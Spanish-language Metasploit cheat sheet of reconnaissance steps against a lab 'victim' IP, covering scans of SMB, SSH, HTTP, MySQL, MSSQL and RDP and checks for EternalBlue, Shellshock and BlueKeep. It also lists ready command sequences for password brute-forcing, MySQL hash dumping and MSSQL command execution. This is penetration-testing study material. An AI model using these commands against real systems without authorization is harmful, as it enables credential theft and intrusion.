# Reconocimiento con Metasploit

Tags: #Metasploit #BlueKeep #EternalBlue #SMB #SSH #HTTP #MySQL #MSSQL 

## Port Scanning

* **Auxiliary Madules:** Son usados para  ejecutar funcionalidades como escanear, descubrir y fuzzear. Podemos usar los módulos auxiliares para ejecutar escaneo de puertos tanto TCP como UDP, así como enumerar información de los servicios como FTP, SSH, HTTP, etc... También, podemos utilizar los módulos auxiliares para descubrir hosts y ejecutar escaneo de puertos en una diferente red o subred desde de obtener el acceso inicial en un sistema target. 

```bash 
# Escaneo de puertos a una sola direccion IP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search portscan                             
	❯ use auxiliary/scanner/portscan/tcp          # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ set PORTS 1-1000
	❯ run 
```

## Puerto 445 SMB 

```bash 
# Miramos la version del SMB
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ search smb                                  
	❯ use auxiliary/scanner/smb/smb_version       # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para saber si soporta SMB2
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb2              # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para enumerar los usuarios que existen en el SMB
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_enumusers     # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Para enumerar los directorios que existen en el SMB
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_enumshares    # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
❯ msfconsole -q                                               # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_login                    # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                               # Colocamos la IP de la maquina victima
	❯ set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix-users.txt 
	❯ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
	❯ set VERBOSE false
	❯ run 

	❯ set smbuser <user>                                # si ya tenemos a un usuario enumerado lo podemos colocar con ese comando

# Diccionarios 
/usr/share/wordlists/metasploit/unix_passwords.txt
/usr/share/metasploit-framework/data/wordlists/common_users.txt
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

```bash 
# Para enumerar los nombres de los 'pipes' que existen en el SMB
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/pipe_auditor      # Usamos el auxiliar
	❯ options
	❯ set smbuser <admin>
	❯ set smbpass <passwd>
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

## EternalBlue (CVE-2017-0144)

```bash 
# Para ver si el Windows en vulnerable al EternalBlue
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/smb/smb_ms17_010      # Usamos el auxiliar
	❯ options
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ run 
```

## Puerto 22 SSH

```bash 
# Enumerar usuarios y passwds con un diccionario de Fuerza Bruta
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/ssh/ssh_login         # Usamos el auxiliar
	❯ options
	❯ set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
	❯ set STOP_ON_SUCCESS true
	❯ set RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ set verbose true
	❯ run 
```


## Puerto 80 HTTP

```bash 
# Miramos la version del HTTP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/http_version      # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ run 
```

```bash 
# Enumeracion de directorios
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/brute_dirs        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ exploit 
```

```bash 
# Enumeracion de robots 'bot'
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/robots_txt        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ run 
```

## Shellshock (CVE-2014-6271)

```bash 
# Para confirmar si es vulnerable a Shellshock
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/http/apache_mod_cgi_bash_env     # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                               # Colocamos la IP de la maquina victima
	❯ run 
```

## Puerto 3306 MYSQL 

```bash 
# Mostrar las bases de datos 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_schemadump             # Usamos el auxiliar 
	❯ options
	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ set username root
	❯ set password ""
	❯ exploit
```

```bash 
# Nos dice que directorios tienen privilegios de escritura 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_writable_dirs        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
	❯ set verbose false
	❯ advanced                                               # Mirar las opciones avanzadas
	❯ set username root
	❯ set password ""
	❯ run
```

```bash 
# Enumeramos los dir sensibles de lectura   
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_file_enum            # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ set file_list /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
	❯ set username root
	❯ set password ""
	❯ run
```

```bash 
# Obtener los hashes de los diferentes usuarios 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_hashdump             # Usamos el auxiliar 
	❯ options
	❯ setg RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ set username root
	❯ set password ""
	❯ exploit
```

```bash 
# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mysql/mysql_login         # Usamos el auxiliar
	❯ options
	❯ set username root
	❯ set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
	❯ set STOP_ON_SUCCESS true
	❯ setg RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ set verbose false
	❯ run 
```

## Puerto 1433 MSSQL

```bash 
# Enumerar passwds con un diccionario de Fuerza Bruta para un usuario especifico
❯ msfconsole -q                                    # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/mssql/mssql_login         # Usamos el auxiliar
	❯ options
	❯ set user_file /root/Desktop/wordlists/common_users.txt
	❯ set pass_file /root/Desktop/wordlists/100-common-passwords.txt
	❯ setg RHOSTS 192.168.1.194                    # Colocamos la IP de la maquina victima
	❯ set verbose false
	❯ run 
```

```bash 
# Enumeramos la configuracion 
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mssql/mssql_enum            # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ run
```

```bash 
# Enumeramos todos los loggins
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mssql/mssql_enum_sql_logins       # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ run
```

```bash 
# Enumeramos los usuarios disponibles en el sistema
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mssql/mssql_enum_domain_accounts       # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ run
```

```bash 
# Podemos ejecutar comandos en la base de datos   
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/admin/mssql/mssql_exec                  # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                              # Colocamos la IP de la maquina victima
	❯ set cmd whoami                                        # Colocamos el comando a ejecutar 
	❯ run
```

## Puerto 3389/33333 RDP

```bash 
# Identifica si el 'endpoint' esta usando RDP
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/rdp/rdp_scanner        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                     # Colocamos la IP de la maquina victima
	❯ set RPORT 3333                               # Configuramos el puerto de RDP en caso que no use el de default 3389
	❯ run 
```

## BlueKeep (CVE-2019-0708)

* Servicio 'ms-wbt-server'

```bash 
# Identifica si la maquina victima es vulnerable al BlueKeep
❯ msfconsole -q                  # q = Quitar el banner de inicio

	❯ use auxiliary/scanner/rdp/cve_2019_0708_bluekeep        # Usamos el auxiliar 
	❯ options
	❯ set RHOSTS 192.168.1.194                                # Colocamos la IP de la maquina victima
	❯ run 
```


------

